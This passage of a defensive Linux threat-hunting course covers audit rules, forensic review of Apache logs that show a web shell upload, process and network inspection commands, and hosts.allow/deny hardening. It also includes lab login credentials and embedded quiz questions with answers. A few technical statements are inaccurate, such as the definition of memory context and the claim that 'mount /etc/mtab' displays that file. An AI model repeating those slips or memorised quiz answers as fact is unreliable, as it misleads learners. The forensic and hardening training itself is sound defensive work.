This syntax includes the following elements:

is the file or directory that requires auditing.

are the permissions that are logged. The values can include r (read), w (write), and a (attribute change).

is a string value that allows the user to input text that may help identify the rule.

To create a filesystem rule, enter the following command:
(trainee@kali-hunt)-[~] $ sudo auditctl -w /etc/hosts -p wa -k hosts_file_change ﻿

The rule audits write and attribute change to anything in the file /etc/hosts. Any change to the file hosts is logged to the audit log with the key name hosts_file_change.

﻿

To ensure the rule is in place, enter the following command:
(trainee@kali-hunt)-[~] $ sudo auditctl -l ﻿

Step 3 returns the following output, which indicates the rule was successfully added to the Linux Audit system:

-w /etc/hosts -p wa -k hosts_file_change ﻿

To ensure the rule is enforced and works as expected, navigate to the following path:
(trainee@kali-hunt)-[~] $ sudo vi /etc/hosts ﻿

Select i to insert text to the file.
﻿

On a new line, enter the following:
New Text ﻿

Save the text by entering the following command:
:wq! ﻿

To confirm the rule is collected query the Audit log with the following command:
(trainee@kali-hunt)-[~] $ ausearch -k hosts_file_change ﻿

The command ausearch allows users to query the Audit log by defined parameters. The query above searches the Audit log for any occurrences of hosts_file_change. Audit logs can be very large, making manual review of the log a nearly impossible task. The command ausearch enables quick and efficient review and discovery of Audit log information.

﻿

Output from the query is similar to Figure 4.4-4, below, although the exact output differs slightly. Each occurrence of the rule is separated by a line. Within the rule exists information pertaining to the time and date the event occurred, the path of the file, the Process Identifier (PID), and the Parent Process Identifier (PPID).

﻿Which component of an Audit log file includes string value allowing the input text and identifying information?

Analyze Logs Read the following scenario. Then, use the skills and information from this lesson to complete the workflow.

﻿

Scenario ﻿

A Cyber Protection Team (CPT) has been assigned a mission within the Virtual City (vCity) University network. The primary object of the mission is to execute analysis of collected Apache logs from the university's web server. The vCityU web server provides facility, staff, and students access to university services and infrastructure. A portion of the vCityU web server experienced unusual activity where text appeared on the hosted site that was not placed by a university official. As a result of the incident, vCityU has taken down the web server and pulled the logs from it. vCityU requires an analysis and review of their logs. The log file includes server requests made from a user on February 28, 2022. The log files have been uploaded to the VM kali-hunt for review and analysis.

﻿

The apache logs contain Hypertext Transfer Protocol (HTTP) response status codes, indicating the status of an HTTP request. Table 4.4-4, below, provides the HTTP response status codes contained in the vCityU logs:

﻿

﻿

Table 4.4-4﻿

﻿

The apache logs files follow the format listed in Table 4.4-5, below:

﻿

﻿

Table 4.4-5﻿

﻿

The log syntax is as follows:

LogFormat "%v %h %l %u %t "%r" %>s %b" vhost_common The format specifiers are:﻿

%v: Virtual host serving the request.

%h: Remote host's IP address.

%l: Remote logname, identd.

%u: Userid of the user making the request.

%t: Time the request was received in the format [day/month/year:hour:minute:second zone].

"%r": Request line as the HTTP request method, path, and protocol.

%s: HTTP status code returned to the client.

%b: Size of the response in bytes, excluding the HTTP header.

The following is an example of a log entry:

77.54.21.11 - - [12/Dec/2018:05:03:34 +0100] "GET /vcityu/student/documents.php?file=220.php&theme=twentysixteen HTTP/1.1" 200 4291 ﻿

This example includes the following elements:

Client IP address: 77.54.21.11

Time stamp: 12/Dec/2018:05:03:34 +0100

Type of request

Method: GET

Resource: /vcityu/student/documents.php?file=220.php&theme=twentysixteen

Protocol: HTTP/1.1

HTTP response code: 200

Bytes sent: 4291

﻿NOTE: When a log contains unknown or undefined information, "-" is placed where the information occurs.

Access the log file, located on the following path:
(trainee@kali-hunt)-[~] less /var/log/apache2/feb28_logs.log.1 ﻿

Analyze the log file to answer the next set of questions.

The following log entry contains 12459 bytes sent. The large number of bytes relative to the other logs, paired with its location, prior to any log containing r57.php, indicates this is likely the log of the malicious file upload.

71.55.82.68 - - [28/Feb/2022:09:05:41 +0100] "GET /vcity/student/plugin-install.php HTTP/1.1" 200 12459 "http://www.vcityu.com/victyu/student/plugin-install.php?tab=upload"

HTTP Response Code 302 The following log entry includes the first occurrence of HTTP response code 302. HTTP response code 302 indicates that the URI of the requested resource has been changed temporarily, therefore the response is redirected.

﻿

71.55.82.68 - - [28/Feb/2022:09:02:46 +0100] "POST /student/vcityu-login.php HTTP/1.1" 302 1150 "http://www.vcityu.com/student/vcityu-login.php" ﻿ Username The following log entry includes unknown or undefined information. The dash "-" indicates unknown or undefined information, so in this case the username is not known or defined in the log.

﻿

71.55.82.68 - - [28/Feb/2022:09:02:23 +0100] "GET /student/vcityu-login.php HTTP/1.1" 200 1568 "-"

Directories for Internals All Linux distributions use a standard directory tree as the file structure. These directories are included under the root directory, as displayed in Figure 5.1-1, below. This lesson focuses on /proc, /etc, and /boot because these are the main Linux directories that contain the internals necessary for a running Linux system. Each of these directories has a specific and important purpose. The information within these directories can be used by an analyst during a hunt in order to gain insight into the inner workings of a Linux system.

The directory /proc contains information about currently running processes and kernel parameters. The content within /proc is used by a number of tools to get vital system statistics and runtime system information. For example, the file /proc/cpuinfo has the information necessary to check processor information in Linux.

The directory /etc contains the core configuration files of the system. It is primarily used by administrators and Linux services and contains information such as the password and networking files. Most changes that are made to system configurations occur within /etc.

The directory /boot contains the files of the kernel and boot image, in addition to Grub or other bootloaders. This directory contains everything required for the boot process. This directory often resides in a partition at the beginning of the disc. Bootloaders allow a user to select different kernel images to execute if there is more than one on the Linux system. If there is only one image, the bootloader loads and executes that image by default.

Manual Observation of Linux Host Processes Linux Processes ﻿

Linux is a multitasking, multi-user system that allows multiple processes to run simultaneously without interfering with each other. Multiple processes running at the same time is a fundamental characteristic of Linux. A process is a task that the Linux OS is currently running. For example, Linux creates a process when a user opens a browser and ends the process when the user closes the browser.

﻿

When a process is created, it is assigned different properties, such as memory context and the Process Identifier (PID). Memory context is a priority that dictates how much time the Central Processing Unit (CPU) allocates to the process. PID is an identification number that Linux automatically assigns to each process. When a Linux computer is powered on, the process that initiates all other processes is assigned PID 1 since it is the first process to start. PID 1 is the first parent process while any other process is a child of either PID 1 or another process deeper in the process tree.

﻿

NOTE: Some Unix-like variations use PID 0 as the first process.

﻿

The directory /proc displays additional numbered directories. Each process within the Linux system has a directory within /proc represented by the process PID number. Other named folders within /proc contain system statistics such as memory (meminfo) or CPU information (cpuinfo). Some of the directories, files, and file containers within /proc are illustrated in Figure 5.1-2, below:

Within the numbered PID folders are other files that contain information related to the process such as the process name and status. Some of the key files within the numbered directories include the following:

cmdline: Command line of the process

cwd: Link to the current working directory of the process

environ: Environmental variables of the process

exe: Link to the executable of the process

fd: File descriptors for a process and the files or devices the process uses

limits: Information about the limits of the process

maps, statm, and mem: Information about the memory a process uses

mounts: Information about mount points

root: Link to the root directory of the process

status: Information about the status of the process

Linux Commands for Analysis ﻿

There are multiple different tools that provide insight into the Linux processes. These tools can be used to gather information about the active processes, provide a real-time view of the kernel-managed tasks, or list out the files and processes that open them. This section reviews the following command tools:

Process status (ps)

Table of processes (top)

List of open files (lsof)

Process Status (ps) ﻿

The Process Status command ps is one of the utilities that Linux provides to view information related to the processes on a system. The command ps lists all currently running processes and their associated PIDs along with other useful information, depending on the options specified. On Linux systems, ps reads the process information from the directory /proc.

﻿

Multiple different options are available to use with ps to change the output of the command. Using the command ps by itself provides the following outputs for the current shell and current user:

PID: Unique process ID

TTY: Terminal type the user is logged into

TIME: Amount of CPU in minutes and seconds that the process has been running

CMD: Name of the command that launched the process

The man page for this command provides additional options such as the following:

ps -e: View all running processes on a system from all users.

ps -ejH: View all processes only in hierarchical order.

ps -U root: View all processes running as root.

ps -U (User) or ps -User (User): View processes for a specific user.

ps -auxwf: View all process information in a process tree format.

ps -aux | grep 'telnet': Search for the PID of the process 'telnet'.

Table of Processes (top) ﻿

The command top is another utility for interacting with Linux processes. The command top provides a dynamic real-time view of running processes on a Linux system. The command displays a summary of the system with a list of processes or threads that are currently being managed by the Linux kernel. The command also provides a system information summary that includes resource utilization, CPU and memory usage, and the uptime for a process. The command top is similar to Task Manager in Windows.

Similar to the command ps, the command top has multiple different options that can be specified to manipulate the output of the command. Directional keys (up, down, left, right) must be used to scroll through the output, while entering the letter q exits the output. Running the command top without specifying any options displays the following outputs:

PID: Tasks process ID

USER: User name of the task owner

PR: Priority of the task

NI: Nice Value of a task.

A negative nice value indicates higher priority while a positive Nice value means lower priority.

VIRT: Total virtual memory used by the task

RES: Anything occupying physical memory

SHR: Amount of shared memory used by the task

S:[code]: Process Status of the task that uses one of the following codes:

D: uninterruptible sleep

I: idle

R: running

S: sleeping

T: stopped by job control signal

t: stopped by debugger during trace

Z: zombie

%CPU: CPU usage

%MEM: Memory usage of task

TIME+: CPU time

COMMAND: Command or command line used to start a task or the name of the associated program.

After entering the top dashboard, there are multiple keys that can be pressed in order to manage the processes or view specific processes. Entering the letter k and the process PID sends a signal to a process. In order to kill a process, enter only the process PID without specifying a signal. For example, in Figure 5.1-3, below, the PID of 1216 was entered to kill the process vmtoolsd.

﻿

﻿

﻿Figure 5.1-3﻿

﻿

Processes can be filtered by specific users, as well. After entering the dashboard, enter the letter u, then specify a user name to see all the processes used by a specific user. The following syntax can also be used: top -u [user name]. By default, top sorts the process list using the column %CPU. Entering any of the following letters sorts the processes by the columns listed:

M: %MEM

N: PID

T: TIME+

P: %CPU

List of Open Files (lsof) ﻿

The command lsof is unlike the other commands in this section because it searches kernel memory to provide a list of all of the open files on a Linux system and the process they belong to. Analysts can use the information this command provides to determine the files a process or user opens. The command lsof lists all opened files by user, processes, and process IDs.

﻿

This command can be very useful during a hunt, while investigating suspicious activity with a process. Analysts can use this command to determine the files that may have been infected or the users that may have been compromised. When running lsof, the following columns are displayed:

Command: Name of the command associated with the process that opened the file

PID: Process ID that opened the file

TID: Task ID

This column is empty when listing a process, rather than a task.

User: User ID or name of the user to whom the process belongs

FD: File descriptor of the file

Type: Type of node associated with the file

Device: Either device numbers or a kernel reference address that identifies the file

Size/Off: Size of the file or the file offset in bytes

Node: Node number of the local file

Name: Name of the mount point and file system on which the file resides

﻿

The command lsof has multiple other options that provide different outputs based on the option specified. These options can be used to search for files based on usernames or by specific processes. If an analyst is able to identify a suspicious process, they can use the command lsof to hunt for that process and any information associated with it, such as usernames or filenames. Some of the common options for the command lsof are:

lsof ^user1: Negates the user PID or UID specified by the caret (^).

Linux searches for all open files except those specified by the caret.

lsof -u user1: Lists all files opened by the specified user.

lsof -c process: Lists all files opened by the specified process.

lsof -p process ID: Lists all files opened by the specified PID.

lsof +D /dir: Lists all files opened by the specified directory.

lsof -i tcp: Lists all files opened by the specified network connection, protocol or port.

Analysts can also combine the commands lsof and grep to filter lsof output and perform advanced searches on a Linux system. This is useful when searching open files for a keyword or port or when searching for files that are locked by a process. Some examples of using lsof with grep include the following:

lsof -i | grep "3000"

This command displays all files involved with "3000". This could be a port required for launching another process that may be busy with a different process. This command returns the PID of the busy process, which can then be used to kill the busy process to free up the port.

sudo lsof / | grep deleted

This command searches the Linux system for files that are deleted, but still being locked by a process.

Observe Linux Host Processes with Scripts The commands in the previous section are useful for analyzing a process. However, when an analyst is investigating a Linux machine, there may be times when specific commands cannot be used or the commands that are being used do not provide a full picture of the process. In these cases, scripts can be created to further analyze a process and take an in-depth look at how the process is interacting with the Linux system.

﻿

Execute a Script to Further Analyze a Process ﻿

Find a process and execute a script to view detailed information about that process.

﻿

Workflow ﻿

Log in to the VM kali-hunt using the following credentials:
Username: trainee Password: CyberTraining1! ﻿

Open a browser.
﻿

Open a terminal console.
﻿

In the terminal, enter the following commands:
(trainee@dmss-kali)-[~] $ top ﻿

Once the top utility has opened, enter the keys shift and M together to sort the data by the %MEM column.
﻿

Identify the PID for the very top entry, which is the web browser (firefox-esr) that was opened in step 2.
﻿

Run the process metrics collection script by entering the following command, where PID is the PID from step 6:
(trainee@dmss-kali)-[~] $ ./process-metrics-collector.sh PID ﻿

This runs the script and collects data about the running process such as CPU usage, memory, Transmission Control Protocol (TCP) connections, and thread count. This script is useful when suspicious processes are identified because it displays additional information about the process in the format .csv.

﻿

Allow the script to run for 2-3 minutes.
﻿

Enter ctrl and c to stop the script.
﻿

Since the script is constantly collecting data, it runs until it is stopped.

﻿

In the top left of the VM, select the folder drop-down.
﻿

Open the data folder.
﻿

Open the folder within the data folder.
﻿

Open the file metrics.csv.
﻿

Select Ok in the Text Import pop-up window.
﻿

The file metrics.csv displays a table of all the information that was collected. This script can be used to analyze the CPU and memory usage as well as any TCP connections for a specific process. An analyst can run this script if they suspect that a process is using large amounts of memory or CPU at specific times throughout the day. The analyst can then use the data from this script to identify the specific time that a process has high usage and any TCP connections during this time. This information provides analysts the specific timeframe that an attack may have occurred, which is critical information for a hunt.

﻿

Display the script and analyze its contents by entering the following command:
(trainee@dmss-kali)-[~] cat process-metrics-collector.sh ﻿

The bottom if section of the script includes the command top. Here, this command serves to get the CPU and memory usage of the specified PID. The command lsof is included to get the TCP connections. Lastly, the command ps is included to get the thread count usage for the specified process.

﻿

Scripts can be created in order to combine multiple different commands into one single output. Sometimes viewing all the data together provides a different viewpoint of a process and additional clues as to how the process is running or if it is malicious.

Manual Observation of Linux Host Communications Linux Host Communications ﻿

When hunting for threats on an environment, analysts often come across Linux systems that are part of the network. These systems often communicate with other Linux and Windows hosts within the network, so it is important to understand how to examine these communications on Linux systems.

﻿

Each Linux distribution has slightly different defaults for the network interfaces, but the traditional network interfaces are named as follows:

eth0: The first ethernet interface for the Linux host. This interface is usually a network interface card connected to the network via ethernet cable. Any additional interfaces would be named eth1, eth2, and so on.

lo: The loopback interface. This is the interface that the system will use to communicate with itself.

wlan0: The name of the first wireless interface on the Linux host. Additional wireless interfaces would be named wlan1, wlan2, and so on.

Multiple different Linux commands are available to help gain insight into the communications between hosts. This section covers some of the most useful Linux commands, which include:

Interface configuration (ifconfig)

Internet protocol (ip)

Name server lookup (nslookup)

Domain information group (dig)

Trace Route (traceroute)

Network Statistics (netstat)

Interface Configuration (ifconfig) ﻿

The command ifconfig configures the network interfaces on a Linux host. This command is used to configure the necessary interfaces when a Linux host is initially set up. After initial setup, the command ifconfig is usually only used when troubleshooting or re-configuring the Internet Protocol (IP) addresses for the host. This command can be used to assign an IP address and netmask to an interface or to enable and disable an interface on a Linux host. Newer Linux distributions do not have ifconfig pre-installed and, instead, use the command ip.

﻿

Multiple options are available to use ifconfig to display different information about the interfaces on the Linux host. These options include the following, which are listed with example interfaces and IP addresses:

ifconfig: Displays information about the network interfaces currently in use.

ifconfig -a: Displays all available interfaces in detail, even if they are down.

ifconfig -s: Displays a summary of the interfaces without additional detail.

ifconfig eth0: Displays information for only the listed interface, such as eth0.

ifconfig eth0 up: Activates a given interface.

ifconfig eth0 down: Deactivates a given interface.

ifconfig eth1 172.16.35.1 netmask 255.255.255.0: Assigns a given IP address and netmask to a given interface.

Internet Protocol (ip) ﻿

The command ip is similar to the command ifconfig in some of the basic functions they both perform. However, the command ip is significantly more powerful. This command provides the routing, devices, and tunnels for a system while also configuring network interfaces or configuring the default and static routing for a Linux host. This command is also used to set up tunnel over IP, list IP addresses, or modify the status of an interface. On most Linux distributions the command ip replaces the command ifconfig.

﻿

The command ip offers multiple options that each provide different information about the communications for a Linux host. The command can be used in many different ways, but the most common use of the ip command is to list the IP addresses on a system, as displayed in Figure 5.1-4, below. The main information from this figure can be broken down as follows:

eth0: The network interface.

state UP: The current state of the interface eth0.

group default: Interfaces can be grouped logically, but their default treatment is to place them in a group named default.

link/ether: The Media Access Control (MAC) address of the interface.

inet: The IP address with the netmask in the Classless Inter-Domain Routing (CIDR) notation.

brd: The broadcast address for this subnet.

﻿

Figure 5.1-4﻿

﻿

The commands ip address show, ip addr show, ip addr, and ip a all provide the same output as in Figure 5.1-4, above.

﻿

Similar to ifconfig, the ip command also offers multiple different options for displaying additional useful information or reconfiguring the Linux systems networking. The options include the following, listed using example interfaces and IP addresses:

ip addr show eth1: Displays the statistics for a single specified interface.

ip -s link: Displays the link layer statistics of all of the active network interfaces.

ip route: Displays the routes that packets take within the network for the Linux host. The first entry is the default route set.

ip route add 192.168.1.0/24 via 10.0.0.1 dev eth1: Adds a static route to the 192 network through a router with an IP address of 10.0.0.1.

ip route del 192.168.1.0/24: Removes the route to the 192 network from the routing table.

ip addr add 192.168.4.44 dev eth1: Adds a specified IP address to the specified interface.

ip addr del 192.168.4.44 dev eth1: Removes an IP address from the specified interface.

ip link set eth1 down; ip link set eth1 up: Stops or starts an interface.

ip link | grep PROMISC: Searches for promiscuous mode, which could indicate a packet sniffer being used by an adversary.

Name Server Lookup (nslookup) ﻿

The name server lookup command, nslookup, provides information from the Domain Name System (DNS) server in a network. This tool is used primarily by network administrators to query the DNS to obtain a domain name or IP address mapping or any other DNS-specific records. The command nslookup is also used to troubleshoot DNS-related issues.

﻿

The command nslookup is simple, but useful. If an analyst comes across a domain name or the IP address of a domain that appears to be suspicious, nslookup can be used to verify that information. The following are the most commonly used nslookup commands using google.com as an example domain name:

nslookup google.com: Displays the A Record (IP address) of the domain.

nslookup 192.168.4.44: Provides the DNS name for the specified IP, if there is one, as a reverse DNS lookup.

nslookup -type=any google.com: Performs a lookup for any Name Server (NS) record for the domain specified but also includes non-NS records.

Domain Information Groper (dig) ﻿

The domain information groper command, dig, retrieves information about DNS name servers. It is used to verify and troubleshoot DNS problems and to perform DNS lookups. The command dig performs similar functions to the command nslookup. The command dig can be used to perform a DNS lookup through domain name or IP address. It can also be used to search for any DNS records. The syntax for this command is as follows, using google.com as the example domain:

dig google.com: Queries the domain A record for the listed domain.

dig google.com +short: Returns only the IP address for the listed domain, rather than the entire A record.

dig google.com ANY: Displays all DNS record types for the listed domain but also includes non-DNS records.

dig -x 172.17.14.210: Looks up a domain name by the specified IP address.

Trace Route (traceroute) ﻿

In Linux, the command traceroute prints the route that a packet takes to reach the intended host. This command is useful when gathering information about a route and all of the hops that a packet takes. The command traceroute tries to get a response from each of the routers at each hop, from the source that runs the command to the destination specified. Network administrators often use this command to find slow routers or to identify where packets are being dropped when a destination is unreachable. The syntax for this command is traceroute google.com, where google.com is replaced with the intended destination.

﻿

Network Statistics (netstat) ﻿

The network statistics command, netstat, is used to display information about various interface statistics, such as the ports that are in use and the processes using them, routing tables, and connection information. This command also displays the sockets that are pending a connection. The command netstat can be useful for analysts who are hunting on a system and suspect that there may be suspicious processes running. Analysts can also use this command to view these processes and the ports that they are using.

﻿

The command netstat has various options that analysts can use to display additional information. Running the command netstat by itself displays a list of all active sockets on the system. Other options to use with the netstat include the following:

netstat -nap: Searches for suspicious port listeners on a system.

netstat -pnltu: Displays all active listening ports on a system.

netstat -a | less: Displays all connected and waiting sockets, one page at a time.

netstat -l | less: Displays all sockets that are in a listening state, one page at a time.

netstat -p -at: Lists the PID of any TCP processes using both a socket and the process name.

netstat -r: Displays the routing table.

netstat -nap | grep "sshd": Searches for a proc ess by name and identifies th e port it is using. Alternatively, "sshd" can be replaced by a port number to search for a proc ess that is using a specific port.

NOTE: Many modern Linux distributions (notably, Debian and Ubuntu) do not install older net tools by default. ss is the modern equivalent of netstat.

﻿Observe Linux Host Communications Manual Observation of Linux Host Communications ﻿

Use the networking commands from the previous section to view detailed information about the Linux system. Then, use the commands to view and observe how a Linux host communicates.

﻿

Workflow ﻿

Log in to the VM kali-hunt using the following credentials:
Username: trainee Password: CyberTraining1! ﻿

Open a terminal console.
﻿

Display the interfaces with their basic information by entering the following command:
(trainee@dmss-kali)-[~] $ ifconfig ﻿

Enter the command ip addr to observe the same interfaces as in step 3 and compare the differences between both commands.
﻿

When using the command ip addr, the MAC address and IP address of each interface are highlighted in color to make them easier to observe.

﻿

Display the default routes for a Linux system by entering the following command:
(trainee@dmss-kali)-[~] $ ip route ﻿

Change the interface of eth1 to down by entering the following command:
(trainee@dmss-kali)-[~] $ sudo ip link set eth1 down [sudo] password for trainee: CyberTraining1! ﻿

Enter the command ip addr to observe the eth1 interface.
﻿

The interface eth1 displays DOWN in red.

﻿

Set eth1 back to up by entering the following command:
(trainee@dmss-kali)-[~] $ sudo ip link set eth1 up [sudo] password for trainee: CyberTraining1! ﻿

Search for suspicious processes on the system by entering the following command:
(trainee@dmss-kali)-[~] $ netstat -nap | less ﻿

This command displays processes from a networking point of view. This command can be used to view the file and protocol that is being used and the state that the process is in.

﻿

Search for any instance of the process ssh by entering the following command:
(trainee@dmss-kali)-[~] $ netstat -nap | grep 'ssh' ﻿

Netstat can also be used to search for any instance of a running process by name to determine whether it is in a listening state. This is helpful in searching for any adversaries that are listening for a specific process or port to use in an attack. In the above command, ssh can be replaced with any process or port that is unknown or suspected of being used by an adversary.

﻿

Select the command that searches for any processes using port 5555. netstat -nap | grep "5555"

Observe Linux Host Communications with Scripts The Linux OS pulls various network parameters and statistics from the directory /proc/net. Each directory and virtual file within this directory contains different aspects of the networking of the system. For example, the file /proc/net/tcp contains all of the system's TCP connection information.

﻿

There are times when the common commands that trainees learns from this lesson are not available on a Linux system. In this case, it is common to create a script that pulls the information from the directory /proc.

﻿

Execute a Script to Observe Linux Communications ﻿

Execute a basic script that pulls the TCP information from the file /proc/net/tcp and provides IP address information as the output.

﻿

Workflow ﻿

Log in to the VM kali-hunt using the following credentials:
Username: trainee Password: CyberTraining1! ﻿

Open a terminal console.
﻿

Populate data into the file /proc/net/tcp and leave the Netcat listener running by entering the following command:
(trainee@dmss-kali)-[~] $ nc -l -p 1337 ﻿

Open a second terminal.
﻿

Display any data within the file /proc/net/tcp by entering the following command:
(trainee@dmss-kali)-[~] $ cat /proc/net/tcp ﻿

The data within this file is in hexadecimal format. It is not very easy to read. It would be more difficult if there were multiple entries.

﻿

Run the networking script with the following command:
(trainee@dmss-kali)-[~] $ ./net.sh ﻿

This script pulls the information from the file /proc/net/tcp and puts it into a more readable format. It provides the local IP address and port of any connections along with the remote address and port. In this example, the connection is the Netcat listener on port 1337. Scripts such as this are useful in an environment that is locked down and does not have internet access.

﻿

Display the script by entering the following command:
(trainee@dmss-kali)-[~] $ cat net.sh ﻿

This script uses the command awk to process the hexadecimal text into a more readable format. It then prints the information from the TCP file into "Local - Remote" output. At the very end is the path that the script is specified to search. The path /proc/net/tcp can be changed to /proc/net/udp, as well, to parse through User Datagram Protocol (UDP) files. This output is similar to using the netstat command. While the script does not display whether a port is listening, anything connected to a remote address of 0.0.0.0:0 is a listening port.

Linux Configuration Files Linux has various configuration files that control system functions such as user permissions, system applications, daemons, services, and other system tasks. Each file serves a specific purpose and most files are structured in different formats. The majority of configuration files on a Linux system are in the directory /etc. Analysts must learn how to identify and modify common Linux configuration files since these files often affect the security of the OS. This section covers the eight configuration files from the directory /etc that are listed in Figure 5.1-5, below.

﻿

﻿

﻿

Figure 5.1-5﻿

﻿

/etc/sudoers ﻿

The file /etc/sudoers is used to determine whether a user has root permissions to run commands or executables that require elevated privileges. If a user attempts to run a command that requires elevated privileges, Linux checks that username against the file sudoers. This happens when the command sudo is used. If Linux does not find the username within the file, the program or command requiring elevated privileges will not run. Root permissions and the tool visudo are required to modify the file /etc/sudoers.

﻿

/etc/hosts, /etc/hosts.allow, and /etc/hosts.deny ﻿

The file /etc/hosts is a simple text file that contains a list of host-to-IP address mappings. This file can be used if the IP of the system is not dynamically generated. The file /etc/hosts is used prior to querying an external DNS server for a hostname-to-IP address mapping. If the Linux system does not find a match in the file /etc/hosts, it checks DNS next. Adversaries often modify the file /etc/hosts when attempting to block security products from successfully connecting to external services. This is done by inserting a bogus entry into the file /etc/hosts that does not actually point to the intended target, such as the localhost (127.0.0.1).

﻿

Each line in the file /etc/hosts consists of an IP address followed by the hostname and then any aliases. The format to add additional entries to the file is IP_ADDRESS HOSTNAME.

﻿

Linux also implements access control lists through the file /etc/hosts to provide added security for network services using the Transmission Control Protocol Wrapper Daemon (TCPD). The file /etc/hosts.allow contains a list of allowed and non-allowed hosts and networks. Connections to network services can be both allowed or denied by defining the access rules in this file. The file /etc/hosts.deny contains a list of hosts or networks that are not allowed to access the Linux system. The access rules in this file can be set up in the file /etc/hosts.allow by using the deny option.

﻿

The access rules in the file /etc/hosts.allow are applied first. These rules take precedence over rules in the file /etc/hosts.deny. If access to a service is allowed in /etc/hosts.allow, any rule denying access to that same service in /etc/hosts.deny is ignored. If there are no rules for a Linux service in either file then access to the service will be granted to all remote hosts.

﻿

The syntax to define an access rule in these files is as follows:

daemon_list : client_list : option ﻿

The components of this syntax include the following:

daemon_list: A comma-separated list of network services such as Secure Shell (SSH) or File Transfer Protocol (FTP), or the keyword ALL for all daemons.

client_list: A comma-separated list of valid hostnames or IP addresses, or the keyword ALL for all clients.

options: An optional command that is executed when a client tries to access a server daemon.

/etc/fstab and /etc/mtab ﻿

The file /etc/fstab is one of the most important configuration files on a Linux system because it specifies the devices and partitions available, as well as where and how to use them. This file is created during the setup of the initial system and it can be modified to fit the use of the system.

﻿

The file /etc/fstab identifies the devices to mount each time the Linux system boots. When the system boots, Linux automatically mounts the volumes that are specified in this file. The file has six different fields that control how a device is mounted. Figure 5.1-6, below, displays an example of an /etc/fstab entry:

﻿

﻿

Figure 5.1-6﻿

﻿

An /etc/fstab entry uses the following format and sequence:

device: Usually the given name or Universally Unique Identifier (UUID) of the mounted device. In the above example it is sr0.

mounting_directory: Designates the directory where the device is mounted. This is the directory where the data can be accessed. In the example, it is /media/cdrom0.

filesystem_type: Specifies the filesystem type.

options: Describes the mount options.

dump: Specifies the option that needs to be used by the backup utility program. If the value is zero, the entry is excluded from taking backup. If it is nonzero, the filesystem is backed up.

fsck: If this value is set to zero, the device is excluded from the fsck check. If the value is nonzero, the device runs in the order in which the value is set.

The file /etc/mtab tracks the currently mounted volumes on the system. When filesystems are mounted and unmounted, the change is immediately reflected in this file. The command mount /etc/mtab displays the contents of the file /etc/mtab to determine the volumes that are currently mounted on a system.

﻿

/systemd and /system ﻿

Most modern Linux distributions use systemd as a system and service manager. Systemd initializes the Linux system after the boot process has finished and it has the first process PID 1. All the systemd tasks are known as units. Each unit is configured by a unit file. Systemd categorizes units according to the type of resource they describe. For a service, this unit file specifies the location of the binary and the start parameters. The most common systemd units include the following:

.service: Describes how to manage a service or application, including how to start or stop the service or when the service should be started.

.mount: Defines a mountpoint on the system.

.device: Describes a device that systemd manages.

.socket: Describes a network or Interprocess Communication (IPC) socket, or a buffer that systemd uses for socket-based activation.

.timer: Defines a timer that is managed by systemd for scheduled activation.

.target: Defines a target unit that is used to provide synchronization points for other units when booting up or changing states.

There are two default locations for the systemd unit files. The first location, /usr/lib/systemd/user, is the default location for unit files that are installed by packages. The next location /etc/systemd/system is the directory for unit files. This directory takes precedence above all others for systemd unit files. The files in this directory are typically services and processes that can be manually configured.

﻿

The command systemctl is used to control the services that are managed by systemd. The most common commands for systemctl include the following:

systemctl start [name.service]

systemctl stop [name.service]

systemctl restart [name.service]

systemctl reload [name.service]

systemctl status [name.service]

systemctl is-active [name.service]

systemctl list-units --type service --all

﻿Modify Linux Configuration Files Linux offers different types of parameters that can be set to restrict and control network access to a system to provide added security. The files /etc/hosts.allow and /etc/hosts.deny can be configured to allow certain networks and services to be used or disallowed on the Linux system. Rules within these files can be set based on hostname, IP address, user name, or process name.

﻿

Modify Linux Configuration Files ﻿

Add rules to the files /etc/hosts.allow and /etc/hosts.deny to harden the Linux system.

﻿

Workflow ﻿

Log in to the VM kali-hunt using the following credentials:
Username: trainee Password: CyberTraining1!

﻿

Open a terminal console.
﻿

To edit the file /etc/hosts.allow, enter the following:
(trainee@dmss-kali)-[~] $ sudo vim /etc/hosts.allow [sudo] password for trainee: CyberTraining1!

﻿

Enter the following on the very first available line:
ALL: 192.168. ﻿

Step 4 allows all hosts within the subnet 192.168.0.0/16 to use all ports and services on the Linux system.

﻿

Enter a line break to start a new line, then enter the following to specify items that are allowed:
ALL: dns.google.com, mail.google.com, 212.23.4.12, 172.16. ﻿

This entry specifies that the two hostnames, dns.google.com and mail.google.com, the IP address 212.23.4.12, and the network 172.16.0.0/16 are all allowed.

﻿

Enter a line break, then enter the following to allow SSH access for any user with the domain name .abc.com:
sshd: .abc.com ﻿

Select esc, and enter :wq! to exit and save the file.
﻿

Open the file /etc/hosts.deny with the following command:
(trainee@dmss-kali)-[~] $ sudo vim /etc/hosts.deny [sudo] password for trainee: CyberTraining1! ﻿

Any entries in the file hosts.allow take precedence over the entries in the file hosts.deny. It is best practice to follow up any allow rules with a deny-all rule in hosts.deny.﻿

﻿

In the file /etc/hosts.deny, on the first available line, add the following entry to deny all services to all hosts that were not specified in the allow file.
ALL: ALL ﻿

On the next available line, add the following entry to deny access to the service sshd for everyone that was not specified in the file hosts.allow.
sshd: ALL ﻿

On the next available line enter the following to deny access to all services to any host that is part of the 10.0.0.0 network:
ALL: 10. ﻿

Select esc, and enter :wq! to exit and save the file.
Which entry in hosts.allow would permit SSH access only to users from the .mil domain? sshd: .mil

Which commands provide the open files, CPU usage, and memory usage of a process? lsof top ﻿ What command searches for any files communicating with port 5555? lsof -i | grep "5555"

Overview of Exploits and Rootkits There are many exploitation techniques that adversaries implement on a variety of systems, including both Windows and Linux. Although these exploits are not unique to Linux, they do have unique properties when considering a Linux environment. The next five sections of this lesson describe how to detect and address the following exploits on Linux systems:

Client execution Ptrace system calls Proc memory Rootkit Kernel modules and extensions

Identifying Exploitation for CE In the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework, Client Execution [T1203] occurs when an adversary "... exploits software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to insecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system."

﻿

This section introduces CE exploits that involve the following features:

Remote Code Execution (RCE)

Local systems or applications

Privilege escalation kernels

RCE Exploits ﻿

As discussed in previous lessons, RCE exploitation occurs when an adversary takes advantage of a system or software vulnerability on a target host and runs arbitrary code from another system. Adversaries perform RCE attacks with code injections to obtain a foothold on the network. MITRE provides two Common Weakness Enumerators (CWE) related to RCE exploits: CWE-94 Code Injection and CWE-95 Eval Injection.

